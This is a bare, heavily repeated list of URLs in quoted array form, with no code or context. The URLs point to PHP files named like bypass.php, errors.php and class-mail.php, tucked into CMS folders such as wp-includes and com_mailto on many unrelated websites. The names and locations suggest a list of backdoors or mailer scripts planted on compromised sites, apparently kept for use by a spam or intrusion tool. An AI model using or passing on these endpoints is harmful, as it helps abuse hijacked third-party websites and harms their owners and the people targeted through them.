"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
